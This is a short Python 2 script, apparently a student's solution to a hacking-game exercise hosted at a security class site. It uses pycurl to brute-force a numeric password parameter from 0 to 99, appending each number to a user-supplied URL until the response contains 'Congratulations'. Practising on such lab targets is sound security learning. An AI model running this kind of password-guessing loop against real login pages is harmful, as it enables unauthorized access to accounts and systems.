import pycurl
from StringIO import StringIO

start_url = input("enter the url that you want to heckle. put it in double quotes: ")
# start_url = 'http://attack.samsclass.info/samsgame1/2/login2-active-vjfj3kj.php?pw='

print type(start_url)

for n in range(0, 100):
    final_url = start_url+str(n)

    buffer = StringIO()
    c = pycurl.Curl()
    c.setopt(c.URL, final_url)
    c.setopt(c.WRITEDATA, buffer)
    c.perform()
    c.close()

    body = buffer.getvalue()
  # Body is a string in some encoding.
  # In Python 2, we can print it without knowing what the encoding is.

    b = "Congratulations"

    if b in body:
        print final_url
        print(body)
        break
    else:
        print("nope, not yet.")
        print("   "+final_url)
